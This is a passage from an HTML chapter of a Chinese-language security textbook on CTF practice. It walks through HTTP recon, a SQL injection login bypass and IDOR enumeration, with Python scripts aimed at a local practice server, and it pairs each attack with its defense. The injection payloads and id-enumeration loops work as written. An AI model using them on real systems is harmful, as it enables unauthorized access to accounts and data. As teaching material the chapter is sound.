@@ -1,0 +1,1188 @@
+<!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Web 攻防、封包分析與檔案鑑識 · CS 自學聖經</title>
+<meta name="description" content="把前面學過的資安理論,變成親手奪旗的實戰。本章帶你在「合法、自架」的靶機上,用 Python 動手練三大 CTF 題型:Web 攻防(HTTP 偵察、SQL 注入繞過登入、IDOR 越權)、封包分析(手刻解析 MAC/IP/TCP 旗標、從 TLS ClientHello 挖出 SNI、揪出 ARP 投毒的中間人)、與檔案鑑識(魔術位元組、檔案修復、carving、LSB 隱寫)。立場為防禦與教育,所有操作只在授權環境與本機靶機上進行,絕不對真實系統出手。">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+TC:wght@400;700&family=Noto+Sans+TC:wght@400;700&family=Lora:ital,wght@0,400;0,600;0,700;1,400&family=Inter:wght@400;600;700;800&family=JetBrains+Mono:wght@400;700&display=swap">
+<link rel="stylesheet" href="../assets/style.css">
+</head>
+<body>
+<div class="layout">
+  <main class="main">
+    <article class="content">
+
+      <div class="eyebrow">第十八部 · 實戰資安 CTF</div>
+      <h1>Web 攻防、封包分析與檔案鑑識</h1>
+      <p class="subtitle">理論章節教你「漏洞長什麼樣、為什麼會發生」;這一章,我們把袖子捲起來,在一台<strong>自己架的、刻意挖了洞的靶機</strong>上,用幾十行 Python 親手把旗子奪下來。你會發現:當你能「動手」重現一個攻擊,你對「如何防它」的理解,會深刻得完全不一樣。</p>
+      <div class="byline">
+        <span class="tag">第 71 章</span>
+        <span>閱讀時間 ≈ 68 分鐘</span>
+        <span>難度:★★★★☆</span>
+      </div>
+
+      <div class="objectives">
+        <div class="o-title">📌 讀完這一章,你會知道</div>
+        <ul>
+          <li><strong>CTF(Capture The Flag,奪旗賽)</strong>是什麼、旗標 <code>FLAG{...}</code> 是什麼,以及為什麼這是把資安理論變成肌肉記憶的最佳練法</li>
+          <li><strong>立場優先</strong>:所有操作<strong>只在你擁有或獲得明確授權的環境、本機靶機</strong>上進行——這條線,我們從頭到尾不會鬆手(呼應第 41 章)</li>
+          <li><strong>Web 攻防</strong>(呼應第 52 章):用 Python <code>requests</code> 做 HTTP 偵察、用 <code>' OR '1'='1</code> 繞過登入(SQL 注入)、用竄改 <code>id</code> 越權看別人的資料(IDOR)——以及每一種對應的<strong>防禦</strong></li>
+          <li><strong>封包分析</strong>(呼應第 25 章):不靠任何套件,<strong>從十六進位手刻</strong>解析出 MAC、IP 標頭、TCP 三向交握的 SYN/ACK 旗標,甚至從加密連線的 ClientHello 挖出明文網址 <strong>SNI</strong></li>
+          <li>封包分析壓軸:<strong>ARP 投毒(ARP spoofing)</strong>的中間人攻擊原理,以及如何「從封包」把它抓出來(同一個 IP 對應到兩個 MAC,呼應第 34 章 MITM)</li>
+          <li><strong>檔案鑑識與隱寫</strong>(呼應第 53 章):魔術位元組(magic bytes)、副檔名造假、檔案修復、metadata/EXIF、<strong>carving</strong> 與 <strong>LSB 隱寫術</strong>——並用 Python 把藏在圖片裡的訊息解出來</li>
+          <li>實戰工具速覽:<code>file</code> / <code>strings</code> / <code>xxd</code> / <code>binwalk</code> / <code>exiftool</code> / <code>stegsolve</code> / <code>zsteg</code> / Wireshark / Burp Suite,各用一句話記住它派什麼用場</li>
+        </ul>
+      </div>
+
+      <h2>從理論到奪旗:歡迎來到 CTF</h2>
+      <p>
+        前面幾章,我們把資安的世界觀(<strong>第 34 章</strong>)、密碼學(<strong>第 35 章</strong>)、防禦性程式設計(<strong>第 36 章</strong>)、
+        Web 安全(<strong>第 52 章</strong>)、數位鑑識(<strong>第 53 章</strong>)都認真讀過了。你「知道」了很多——知道 SQL 注入怎麼發生、
+        知道封包一層層套著、知道檔案有「魔術位元組」。但「知道」和「做得出來」之間,隔著一條看不見的河。
+        這一章,就是帶你親手划過去。
+      </p>
+      <p>
+        划船的工具,叫做 <strong>CTF(Capture The Flag,奪旗賽)</strong>:一種把資安技能<strong>遊戲化</strong>的競賽。
+        最常見的「解題型(Jeopardy)」CTF 長這樣——主辦方準備一堆刻意藏著漏洞或祕密的題目,分成 <strong>Web、Pwn(二進位攻擊)、
+        Crypto(密碼)、Forensics(鑑識)、Reversing(逆向)、Misc(雜項)</strong>等類別;你的任務是想辦法把每題藏起來的
+        「<strong>旗標(flag)</strong>」找出來。旗標通常是一串有固定格式的字串,像 <code>FLAG{...}</code>、<code>flag{...}</code>、
+        <code>picoCTF{...}</code>,把它貼回計分板就得分。一面旗,代表你「真的做到了」這件事——它無從造假,因為你拿不到旗,就是沒攻下。
+      </p>
+      <p>
+        CTF 之所以是學資安最好的練法,正是因為這個「無從造假」:它逼你從「讀懂」走到「做出」。本章我們聚焦三類最適合入門、
+        又最能對應前面理論的題型,而且全部用 <strong>Python 為主、實作導向</strong>地走一遍:
+      </p>
+
+      <div class="diagram">
+<svg viewBox="0 0 760 280" xmlns="http://www.w3.org/2000/svg" font-family="Inter, 'Noto Sans TC', sans-serif">
+  <text x="380" y="28" text-anchor="middle" font-size="14" font-weight="800" fill="#1f2328">本章的三條奪旗路線</text>
+  <!-- web -->
+  <rect x="30" y="56" width="220" height="180" rx="12" fill="#fdece5" stroke="#b4541f" stroke-width="2"/>
+  <text x="140" y="84" text-anchor="middle" font-size="14" font-weight="800" fill="#b4541f">A · Web 攻防</text>
+  <text x="140" y="104" text-anchor="middle" font-size="11" fill="#4a5159">「網站尋寶」</text>
+  <text x="140" y="132" text-anchor="middle" font-size="11" fill="#1f2328">HTTP 偵察</text>
+  <text x="140" y="152" text-anchor="middle" font-size="11" fill="#1f2328">SQL 注入繞登入</text>
+  <text x="140" y="172" text-anchor="middle" font-size="11" fill="#1f2328">IDOR 越權</text>
+  <text x="140" y="206" text-anchor="middle" font-size="10.5" font-weight="700" fill="#b4541f">呼應第 52 章</text>
+  <text x="140" y="224" text-anchor="middle" font-size="10" fill="#8a929b">靶機:vuln_server</text>
+  <!-- network -->
+  <rect x="270" y="56" width="220" height="180" rx="12" fill="#e3efed" stroke="#2f6f6a" stroke-width="2"/>
+  <text x="380" y="84" text-anchor="middle" font-size="14" font-weight="800" fill="#2f6f6a">B · 封包分析</text>
+  <text x="380" y="104" text-anchor="middle" font-size="11" fill="#4a5159">「封包偵探」</text>
+  <text x="380" y="132" text-anchor="middle" font-size="11" fill="#1f2328">手刻解析 MAC/IP/TCP</text>
+  <text x="380" y="152" text-anchor="middle" font-size="11" fill="#1f2328">挖出 SNI 網址</text>
+  <text x="380" y="172" text-anchor="middle" font-size="11" fill="#1f2328">揪出 ARP 中間人</text>
+  <text x="380" y="206" text-anchor="middle" font-size="10.5" font-weight="700" fill="#2f6f6a">呼應第 25、34 章</text>
+  <text x="380" y="224" text-anchor="middle" font-size="10" fill="#8a929b">素材:抓包檔(十六進位)</text>
+  <!-- forensics -->
+  <rect x="510" y="56" width="220" height="180" rx="12" fill="#ede9fe" stroke="#8b5cf6" stroke-width="2"/>
+  <text x="620" y="84" text-anchor="middle" font-size="14" font-weight="800" fill="#8b5cf6">C · 檔案鑑識</text>
+  <text x="620" y="104" text-anchor="middle" font-size="11" fill="#4a5159">「檔案鑑識官」</text>
+  <text x="620" y="132" text-anchor="middle" font-size="11" fill="#1f2328">魔術位元組/修復</text>
+  <text x="620" y="152" text-anchor="middle" font-size="11" fill="#1f2328">metadata / carving</text>
+  <text x="620" y="172" text-anchor="middle" font-size="11" fill="#1f2328">LSB 隱寫術</text>
+  <text x="620" y="206" text-anchor="middle" font-size="10.5" font-weight="700" fill="#8b5cf6">呼應第 53 章</text>
+  <text x="620" y="224" text-anchor="middle" font-size="10" fill="#8a929b">素材:藏旗的檔案</text>
+</svg>
+        <figcaption>圖 71-1:本章的三條路線。每一條都對應一個你已經讀過的理論章節——這一章的工作,就是把那些理論,變成你雙手做得出來的事。</figcaption>
+      </div>
+
+      <h2>開打前的鐵律:只打授權靶機</h2>
+      <p>
+        在寫任何一行攻擊程式之前,我們得先把最重要的事情講清楚——比任何技術都重要。這一章會教你怎麼讓登入繞過、怎麼越權讀別人的資料、
+        怎麼從別人的連線封包還原網址。這些能力,只有在<strong>對的地方</strong>使用,才是「白帽」;用錯地方,就是犯罪。
+      </p>
+
+      <div class="callout danger">
+        <div class="ico">⛔</div>
+        <div class="body">
+          <span class="c-title">這條線,從頭到尾不鬆手</span>
+          <p>本章所有的「攻擊」操作,<strong>只能對你自己擁有、或獲得明確書面授權的環境</strong>進行——具體來說,就是你
+          <strong>在自己電腦上跑起來的本機靶機(如 <code>vuln_server.py</code>、DVWA、OWASP Juice Shop、WebGoat)</strong>,
+          或像 PortSwigger Web Security Academy、picoCTF 這種<strong>專門設計給你合法練習</strong>的平台。
+          <strong>絕對不要</strong>對任何不屬於你的真實系統(別人的網站、公司的伺服器、學校的服務、公共 Wi-Fi 上別人的流量)做這些事——
+          即使「只是看看」、即使你沒造成損害,在絕大多數國家(包含台灣的《刑法》妨害電腦使用罪章)<strong>都是犯罪</strong>。
+          封包分析也一樣:你只能分析<strong>你有權擷取的流量</strong>(你自己的機器、實驗室授權的抓包檔),竊聽他人通訊同樣違法。
+          這條倫理與法律的界線,我們在<strong>第 52、53 章</strong>反覆強調過,並會在<strong>第 41 章「計算倫理」</strong>正式深入。
+          技術是中性的;<strong>讓它成為盾,而不是矛,是工程師不可退讓的職業底線。</strong></p>
+        </div>
+      </div>
+
+      <p>
+        為什麼要練攻擊?因為<strong>你必須先看懂攻擊怎麼成立,才能真正把它擋住</strong>。一個沒親手繞過過登入的人,
+        寫起參數化查詢總是半信半疑;一個親手用 <code>' OR '1'='1</code> 把登入打穿過一次的人,從此再也不會把使用者輸入直接拼進 SQL。
+        本章的每一個攻擊示範,後面都緊跟著一段「<strong>那要怎麼防</strong>」——攻是為了學防,這是貫穿全章的精神。
+      </p>
+
+      <h2>Web 攻防(一):HTTP 實戰與偵察</h2>
+      <p>
+        Web 攻防的第一步,永遠是<strong>偵察(reconnaissance,recon)</strong>:在動手之前,先把目標看清楚。
+        而看清楚一個網站,靠的就是<strong>第 25 章</strong>那套 HTTP 請求-回應模型。我們先用兩個工具把這套地基喚醒:
+        瀏覽器的<strong>開發者工具(DevTools)</strong>,以及 Python 的 <code>requests</code> 套件。
+      </p>
+      <p>
+        先在本機把靶機跑起來(假設靶機監聽 <code>http://127.0.0.1:8000</code>)。打開瀏覽器按 <kbd>F12</kbd> 開啟 DevTools,
+        切到「Network(網路)」分頁重新整理頁面,你會看到每一個請求的<strong>方法、狀態碼、回應標頭、cookie</strong>——
+        這就是 Web 的「X 光機」。但在 CTF 與自動化測試裡,我們更愛用程式來看,因為它可以重複、可以批次、可以寫成腳本:
+      </p>
+      <pre><code class="language-python">import requests
+
+BASE = "http://127.0.0.1:8000"          # ← 本機靶機,絕不是真實網站
+
+r = requests.get(BASE + "/")            # 發一個 GET 請求到首頁
+print("狀態碼 :", r.status_code)         # 200 / 301 / 403 / 404 ... (第 25 章)
+print("伺服器 :", r.headers.get("Server"))
+print("Cookie :", r.cookies.get_dict()) # 伺服器有沒有發 Set-Cookie?
+print("------ 回應內容(前 300 字)------")
+print(r.text[:300])</code></pre>
+      <p>
+        幾行程式,就把瀏覽器在背景做的事攤在你眼前:你發出請求、伺服器回你一個<strong>狀態碼</strong>
+        (<code>200</code> 成功、<code>301/302</code> 轉址、<code>403</code> 禁止、<code>404</code> 找不到)、一份<strong>回應標頭</strong>、
+        可能還有 <strong>cookie</strong>,以及最重要的——<strong>回應內容(HTML)</strong>。偵察的精髓,就是在這些東西裡找「不該被你看到、卻被看到了」的線索。
+      </p>
+
+      <h3>最經典的偵察:看原始碼與 robots.txt</h3>
+      <p>
+        新手最容易忽略、卻最常中獎的兩個地方:<strong>網頁原始碼裡的註解</strong>,和 <code>robots.txt</code>。
+        開發者常把測試帳密、隱藏路徑、甚至旗標,寫在 HTML 註解裡以為「使用者看不到」——但任何人按右鍵「檢視原始碼」就一覽無遺。
+        而 <code>robots.txt</code> 本意是告訴搜尋引擎「哪些路徑別爬」,結果反而像一張「<strong>這裡有東西別看喔</strong>」的藏寶圖,
+        把後台路徑通通列出來:
+      </p>
+      <pre><code class="language-python">import re, requests
+BASE = "http://127.0.0.1:8000"
+
+def find_flag(text):
+    """從一段文字裡撈出 FLAG{...} 格式的旗標"""
+    m = re.search(r"FLAG\{[^}]*\}", text)
+    return m.group(0) if m else "(沒找到)"
+
+# 偵察點 1:首頁 HTML 原始碼裡的註解,例如 &lt;!-- FLAG{...} --&gt;
+html = requests.get(BASE + "/").text
+print("原始碼註解的旗 :", find_flag(html))
+
+# 偵察點 2:robots.txt 常洩漏不該公開的路徑
+print("------ robots.txt ------")
+print(requests.get(BASE + "/robots.txt").text)</code></pre>
+      <div class="callout tip">
+        <div class="ico">💡</div>
+        <div class="body">
+          <span class="c-title">偵察就是「把每個角落都翻一遍」</span>
+          <p>除了原始碼註解與 <code>robots.txt</code>,常見的偵察點還有:<code>/sitemap.xml</code>、<code>.git/</code> 目錄外洩、
+          備份檔(<code>index.php.bak</code>、<code>config.old</code>)、回應標頭裡的版本資訊、錯誤頁面噴出的堆疊追蹤、
+          以及 JavaScript 檔案裡寫死的 API 端點與金鑰。<strong>偵察不需要高深技巧,需要的是耐心與「什麼都點開看一下」的好奇心。</strong>
+          在防禦面,這也提醒你:<strong>別把任何祕密留在前端或公開檔案裡</strong>——使用者「看不到」不等於「拿不到」(這正是第 52 章「把按鈕藏起來不是安全」的同一個道理)。</p>
+        </div>
+      </div>
+
+      <div class="exercise">
+        <div class="ex-head">✏️ 練習 71.1 <span class="badge">實作</span></div>
+        <div class="ex-body">
+          <p>在本機把靶機 <code>vuln_server.py</code> 跑起來後,寫一支 Python 程式完成「偵察關」:
+          (a) 抓首頁 HTML,找出藏在註解裡的旗標;(b) 抓 <code>robots.txt</code>,印出它「不希望被爬」的路徑。
+          請用 <code>requests</code> 與一個 <code>find_flag()</code> 輔助函式。並回答:這一關暴露了什麼樣的開發壞習慣?</p>
+          <details class="solution">
+            <summary>看解答</summary>
+            <div class="sol-body">
+              <pre><code class="language-python">import re, requests
+BASE = "http://127.0.0.1:8000"          # 本機授權靶機
+
+def find_flag(text):
+    m = re.search(r"FLAG\{[^}]*\}", text)
+    return m.group(0) if m else "(沒找到)"
+
+# (a) 首頁原始碼註解
+html = requests.get(BASE + "/").text
+print("[Recon] 原始碼旗標 :", find_flag(html))
+
+# (b) robots.txt 洩漏的路徑
+robots = requests.get(BASE + "/robots.txt").text
+paths = [line.split(":", 1)[1].strip()
+         for line in robots.splitlines()
+         if line.lower().startswith("disallow")]
+print("[Recon] robots.txt Disallow 的路徑 :", paths)</code></pre>
+              <p><strong>暴露的壞習慣:</strong>把敏感資訊(旗標、隱藏後台路徑)放在「使用者理論上看不到、但實際上隨手可得」的地方——
+              HTML 註解會被瀏覽器下載、<code>robots.txt</code> 是公開檔案。正確做法是:祕密只留在伺服器端,
+              敏感路徑靠<strong>真正的存取控制</strong>保護,而不是靠「藏起來」(security through obscurity 不是安全)。</p>
+            </div>
+          </details>
+        </div>
+      </div>
+
+      <h2>Web 攻防(二):SQL 注入繞過登入</h2>
+      <p>
+        偵察完,進入第一個真正的攻擊。<strong>第 36、52 章</strong>都講過 <strong>SQL 注入(SQL injection)</strong>的成因:
+        當程式把使用者輸入<strong>直接拼進</strong> SQL 查詢字串,使用者就能讓自己的輸入「越界」變成 SQL 語法的一部分。
+        現在我們親手做一次最經典的——<strong>繞過登入</strong>。
+      </p>
+      <p>
+        假設靶機的登入後端,寫了這樣一段會出事的程式(這是<strong>反面教材</strong>):
+      </p>
+      <pre><code class="language-python"># ⛔ 靶機裡刻意留的漏洞:把帳密「直接拼進」SQL
+def check_login(username, password):
+    query = ("SELECT * FROM users "
+             "WHERE username = '" + username + "' "
+             "AND password = '" + password + "'")
+    return db.execute(query).fetchone()    # 有撈到一列 → 視為登入成功</code></pre>
+      <p>
+        正常情況下,你輸入 <code>alice</code> / <code>secret</code>,查詢變成
+        <code>... WHERE username = 'alice' AND password = 'secret'</code>,只有帳密都對才撈得到那一列。
+        但如果我們在帳號欄位填入 <code>' OR '1'='1' -- </code> 呢?(注意最後有個空格,讓 <code>--</code> 真正生效。)拼接後的查詢變成:
+      </p>
+      <pre><code class="language-sql">SELECT * FROM users WHERE username = '' OR '1'='1' -- ' AND password = '...'</code></pre>
+      <p>
+        三件事同時發生,登入就此被攻破:
+      </p>
+      <ul>
+        <li>那個 <code>'</code>(單引號)<strong>提前關閉</strong>了 <code>username</code> 的字串,讓後面的東西被當成 SQL 語法,而不是資料。</li>
+        <li><code>OR '1'='1'</code> 是一個<strong>恆真</strong>的條件——只要有 OR 接上一個永遠成立的判斷,整個 <code>WHERE</code> 就對所有列都成立。</li>
+        <li><code>--</code> 是 SQL 的<strong>行註解</strong>,它把後面的 <code>AND password = '...'</code> 整段「<strong>註解掉</strong>」,密碼檢查直接消失。</li>
+      </ul>
+      <p>
+        結果:查詢撈回了使用者表的<strong>第一列</strong>(通常就是管理員),伺服器以為帳密正確,放你進去。我們用 <code>requests</code> 自動化這個攻擊:
+      </p>
+      <pre><code class="language-python">import re, requests
+BASE = "http://127.0.0.1:8000"          # 本機授權靶機
+
+def find_flag(text):
+    m = re.search(r"FLAG\{[^}]*\}", text)
+    return m.group(0) if m else "(沒找到)"
+
+# 經典的登入繞過 payload:' OR '1'='1' --
+payload = {"username": "' OR '1'='1' -- ", "password": "whatever"}
+r = requests.post(BASE + "/login", data=payload)
+
+print("狀態碼 :", r.status_code)
+print("繞過登入拿到的旗 :", find_flag(r.text))</code></pre>
+
+      <div class="diagram">
+<svg viewBox="0 0 720 250" xmlns="http://www.w3.org/2000/svg" font-family="Inter, 'Noto Sans TC', sans-serif">
+  <text x="360" y="26" text-anchor="middle" font-size="13" font-weight="800" fill="#1f2328">一個單引號,如何把「資料」變成「指令」</text>
+  <text x="30" y="64" font-size="12" font-weight="700" fill="#8a929b">你在帳號欄位輸入:</text>
+  <rect x="30" y="74" width="320" height="30" rx="5" fill="#fdece5" stroke="#b4541f"/>
+  <text x="44" y="94" font-size="13" font-family="monospace" fill="#1f2328">' OR '1'='1' -- </text>
+
+  <text x="30" y="138" font-size="12" font-weight="700" fill="#8a929b">拼進 SQL 後,實際被執行的是:</text>
+  <rect x="30" y="148" width="660" height="34" rx="5" fill="#eef6f5" stroke="#2f6f6a"/>
+  <text x="44" y="170" font-size="12.5" font-family="monospace" fill="#1f2328">... WHERE username = <tspan fill="#b4541f" font-weight="700">'' OR '1'='1'</tspan> <tspan fill="#8b5cf6" font-weight="700">--</tspan> ' AND password = '...'</text>
+
+  <text x="120" y="212" text-anchor="middle" font-size="11" fill="#b4541f">↑ 恆真,WHERE 對每一列都成立</text>
+  <text x="470" y="212" text-anchor="middle" font-size="11" fill="#8b5cf6">↑ 後面整段密碼檢查被註解掉</text>
+  <text x="360" y="236" text-anchor="middle" font-size="11" font-weight="700" fill="#1f2328">→ 撈回第一個使用者(通常是 admin),登入被繞過</text>
+</svg>
+        <figcaption>圖 71-2:SQL 注入登入繞過的解剖。核心永遠是那句話:<strong>資料越界,變成了指令</strong>。單引號跳出字串、<code>OR '1'='1'</code> 讓條件恆真、<code>--</code> 註解掉密碼檢查,三招合一就攻破了登入。</figcaption>
+      </div>
+
+      <h3>那要怎麼防?參數化查詢</h3>
+      <p>
+        你親手打穿了登入,現在你會對防禦有完全不同的體感。解法<strong>第 36、52 章</strong>都講過,這裡再釘一次:
+        <strong>參數化查詢(prepared statement / parameterized query)</strong>。它讓「資料」和「指令」走<strong>兩條完全分開的通道</strong>,
+        資料庫永遠把參數當「純資料」,無論裡面有多少單引號、<code>OR</code> 或 <code>--</code>,都不可能變成 SQL 語法:
+      </p>
+      <pre><code class="language-python"># ⛔ 危險:字串拼接(f-string 跟字串相加一樣致命)
+def check_login(u, p):
+    return db.execute(
+        f"SELECT * FROM users WHERE username='{u}' AND password='{p}'"
+    ).fetchone()
+
+# ✅ 安全:參數化查詢,資料走獨立通道,? 裡的東西永遠是「純資料」
+def check_login(u, p):
+    return db.execute(
+        "SELECT * FROM users WHERE username = ? AND password = ?", (u, p)
+    ).fetchone()</code></pre>
+      <p>
+        當然,真實系統還要再加一層:<strong>密碼絕不明文比對</strong>,而是存「加鹽的慢雜湊」(bcrypt/scrypt/Argon2,呼應第 35 章),
+        登入時比對雜湊。但擋住 SQL 注入這個洞的<strong>根本</strong>,就是參數化——把資料和指令徹底分開。
+      </p>
+
+      <div class="exercise">
+        <div class="ex-head">✏️ 練習 71.2 <span class="badge">實作</span></div>
+        <div class="ex-body">
+          <p>在本機靶機上,寫一支 Python 程式,用 <code>requests</code> 自動對 <code>/login</code> 發出 SQL 注入 payload 繞過登入、拿到旗標。
+          進階:除了 <code>' OR '1'='1' -- </code>,再多試一個不同寫法的 payload(例如用 <code>#</code> 當註解、或 <code>' OR 1=1 -- </code>),
+          並說明為什麼它們效果相同。最後寫出「正確的後端」應該長什麼樣。</p>
+          <details class="solution">
+            <summary>看解答</summary>
+            <div class="sol-body">
+              <pre><code class="language-python">import re, requests
+BASE = "http://127.0.0.1:8000"          # 本機授權靶機
+
+def find_flag(text):
+    m = re.search(r"FLAG\{[^}]*\}", text)
+    return m.group(0) if m else "(沒找到)"
+
+# 試多個等效 payload,逐一測試哪個能繞過
+payloads = [
+    "' OR '1'='1' -- ",     # 單引號跳出 + 恆真 + 行註解
+    "' OR 1=1 -- ",         # 1=1 同樣恆真
+    "admin' -- ",           # 已知帳號 + 直接註解掉密碼檢查
+]
+for p in payloads:
+    r = requests.post(BASE + "/login",
+                      data={"username": p, "password": "x"})
+    flag = find_flag(r.text)
+    print(f"payload={p!r:24} → {flag}")</code></pre>
+              <p><strong>為什麼等效:</strong>三者都做到同一件事——用 <code>'</code> 跳出 <code>username</code> 字串、
+              用一個恆真條件(<code>'1'='1'</code> 或 <code>1=1</code>)或一個已知帳號(<code>admin'</code>)讓查詢撈到一列,
+              再用註解符號(<code>--</code> 或某些資料庫的 <code>#</code>)把後面的密碼檢查整段消掉。差別只是「讓 WHERE 成立」的手法不同。</p>
+              <p><strong>正確的後端:</strong>用參數化查詢(<code>... WHERE username = ? AND password = ?</code>),
+              並改成「先用帳號查出該使用者、再用 bcrypt 等比對密碼雜湊」,而不是把密碼也拼進 SQL。這樣任何 payload 都只會被當成「一個剛好叫這個怪名字的帳號」,查無此人而已。</p>
+            </div>
+          </details>
+        </div>
+      </div>
+
+      <h2>Web 攻防(三):IDOR 越權存取</h2>
+      <p>
+        第三個 Web 攻擊,是 OWASP 常年第一名的洞:<strong>不安全的直接物件參考(Insecure Direct Object Reference,IDOR)</strong>。
+        它的本質是<strong>授權(authorization)缺失</strong>——系統檢查了「你有沒有登入」(認證),卻忘了檢查「這筆資料是不是你的」(授權)。
+      </p>
+      <p>
+        想像靶機有個「看公告」的端點 <code>/note?id=1</code>。你登入後,看到自己的公告網址是 <code>?id=1</code>。
+        於是你做一件再自然不過的事:把 <code>1</code> 改成 <code>2</code>、<code>3</code>……結果你看到了<strong>別人的</strong>、甚至管理員的私人公告。
+        這就是 IDOR——<strong>靠竄改一個可預測的 id,就存取了不屬於你的資源</strong>:
+      </p>
+      <pre><code class="language-python">import re, requests
+BASE = "http://127.0.0.1:8000"          # 本機授權靶機
+
+def find_flag(text):
+    m = re.search(r"FLAG\{[^}]*\}", text)
+    return m.group(0) if m else "(沒找到)"
+
+# 逐一嘗試不同的 id,看看哪一個翻出了「不該給我看」的資料
+for note_id in range(1, 6):
+    r = requests.get(BASE + "/note", params={"id": note_id})
+    flag = find_flag(r.text)
+    mark = "  ← 越權看到別人的!" if flag != "(沒找到)" else ""
+    print(f"/note?id={note_id} → {flag}{mark}")</code></pre>
+      <p>
+        看出 IDOR 為什麼可怕了嗎?它不需要任何高深技巧——一個迴圈、一個會自己加一的數字,就能把整個資料庫的資料「<strong>枚舉(enumerate)</strong>」出來。
+        現實中無數的資料外洩事件,起點就是這麼樸素的一個漏洞。
+      </p>
+
+      <h3>那要怎麼防?伺服器端的存取控制</h3>
+      <p>
+        修法<strong>第 52 章</strong>講得很清楚:在伺服器端,對<strong>每一個</strong>敏感操作,都明確檢查「這筆資源,是不是屬於當前這個使用者」:
+      </p>
+      <pre><code class="language-python"># ⛔ 只檢查「有沒有登入」,沒檢查「這筆是不是你的」
+@app.route("/note")
+def get_note():
+    note = db.get_note(request.args.get("id"))
+    return render(note)                    # 改 id 就能看別人的
+
+# ✅ 在伺服器端比對「擁有者是否為當前使用者」
+@app.route("/note")
+def get_note():
+    note = db.get_note(request.args.get("id"))
+    if note is None or note.owner_id != current_user.id:
+        abort(404)                         # 不是你的 → 當作不存在
+    return render(note)</code></pre>
+      <div class="callout key">
+        <div class="ico">🔑</div>
+        <div class="body">
+          <span class="c-title">認證 ≠ 授權</span>
+          <p>IDOR 的教訓只有一句話:<strong>「你是誰」(認證)和「你能碰什麼」(授權)是兩個獨立的檢查,缺一不可。</strong>
+          系統常把力氣全花在登入機制上,卻在每個讀資料、改資料的端點忘了再問一句「這個<em>已登入</em>的人,有權碰<em>這一筆</em>嗎?」。
+          補強的方向有兩個:一是<strong>每個敏感操作都做伺服器端的擁有者/權限檢查</strong>(治本);二是<strong>別用可預測的流水號當對外的 id</strong>
+          (改用隨機的 UUID,讓攻擊者連「下一個 id 是什麼」都猜不到——這是縱深防禦的第二層,但不能取代授權檢查)。</p>
+        </div>
+      </div>
+
+      <div class="exercise">
+        <div class="ex-head">✏️ 練習 71.3 <span class="badge">實作</span></div>
+        <div class="ex-body">
+          <p>在本機靶機上,寫一支程式枚舉 <code>/note?id=</code> 從 1 到 N,找出「藏在別人 id 底下」的旗標(觸發 IDOR)。
+          然後回答:如果開發者把對外的 id 從 <code>1, 2, 3...</code> 改成隨機 UUID(如 <code>f47ac10b-...</code>),
+          這樣<strong>就安全了嗎</strong>?為什麼?</p>
+          <details class="solution">
+            <summary>看解答</summary>
+            <div class="sol-body">
+              <pre><code class="language-python">import re, requests
+BASE = "http://127.0.0.1:8000"          # 本機授權靶機
+
+def find_flag(text):
+    m = re.search(r"FLAG\{[^}]*\}", text)
+    return m.group(0) if m else "(沒找到)"
+
+found = {}
+for note_id in range(1, 21):            # 枚舉 id 1..20
+    r = requests.get(BASE + "/note", params={"id": note_id})
+    flag = find_flag(r.text)
+    if flag != "(沒找到)":
+        found[note_id] = flag
+print("越權翻到的旗標 :", found)</code></pre>
+              <p><strong>改成 UUID 就安全了嗎?不完全。</strong>把可預測的流水號換成隨機 UUID,確實讓攻擊者<em>很難「猜」</em>下一個 id,
+              大幅提高了枚舉成本——這是有價值的「縱深防禦」一層。<strong>但它治標不治本:</strong>UUID 本質上仍只是「不好猜的 id」,
+              一旦攻擊者透過其他管道拿到了某個別人的 UUID(從分享連結、日誌、Referer、前端程式碼洩漏),沒有授權檢查的端點照樣會把資料吐給他。
+              <strong>真正的修法,永遠是伺服器端的擁有者/權限檢查;UUID 只是錦上添花。</strong></p>
+            </div>
+          </details>
+        </div>
+      </div>
+
+      <h2>封包分析(一):從十六進位看見分層</h2>
+      <p>
+        換跑道。Web 攻防是站在「應用層」打,接下來我們要潛到更底層——<strong>封包(packet)</strong>。
+        這一整段,我們<strong>不裝任何套件</strong>(不用 scapy、不用 Wireshark),純粹用 Python 從<strong>一堆十六進位</strong>裡,
+        親手把封包一層層拆開。這正是 CTF 鑑識/網路題最需要的底層功力,也是把<strong>第 25 章</strong>網路分層從「圖」變成「手感」的最好方法。
+      </p>
+      <p>
+        還記得第 25 章那個比喻嗎?一個封包像<strong>俄羅斯娃娃</strong>:最外面是<strong>乙太網路(Ethernet)</strong>標頭(管「這一段線路上,從哪張網卡到哪張網卡」),
+        裡面包著 <strong>IP</strong> 標頭(管「從哪個 IP 到哪個 IP」),再裡面是 <strong>TCP</strong> 標頭(管「哪個埠到哪個埠、連線狀態」),
+        最核心才是真正要傳的<strong>資料</strong>。在乙太網路上,這幾層的長度很固定:
+      </p>
+
+      <div class="diagram">
+<svg viewBox="0 0 720 220" xmlns="http://www.w3.org/2000/svg" font-family="Inter, 'Noto Sans TC', sans-serif">
+  <text x="360" y="26" text-anchor="middle" font-size="13" font-weight="800" fill="#1f2328">一個封包的「俄羅斯娃娃」結構</text>
+  <rect x="30" y="50" width="660" height="140" rx="10" fill="#fdece5" stroke="#b4541f" stroke-width="2"/>
+  <text x="48" y="72" font-size="12" font-weight="800" fill="#b4541f">乙太網路標頭(14 bytes)</text>
+  <text x="48" y="90" font-size="10.5" fill="#8a929b">目的 MAC(6) + 來源 MAC(6) + 型別(2)</text>
+
+  <rect x="60" y="98" width="600" height="84" rx="8" fill="#e3efed" stroke="#2f6f6a" stroke-width="2"/>
+  <text x="78" y="118" font-size="12" font-weight="800" fill="#2f6f6a">IP 標頭(通常 20 bytes)</text>
+  <text x="78" y="136" font-size="10.5" fill="#8a929b">版本/長度 + TTL + 協定 + 來源 IP(4) + 目的 IP(4)</text>
+
+  <rect x="90" y="144" width="540" height="30" rx="6" fill="#ede9fe" stroke="#8b5cf6" stroke-width="2"/>
+  <text x="108" y="164" font-size="12" font-weight="800" fill="#8b5cf6">TCP 標頭(20 bytes) + 真正的資料 ...</text>
+</svg>
+        <figcaption>圖 71-3:封包的分層。解析的訣竅,就是「按著固定的位移(offset)去切」:乙太網路佔 0–13、IP 從 14 開始、TCP 接在 IP 後面。看懂這張圖,你就能徒手拆封包。</figcaption>
+      </div>
+
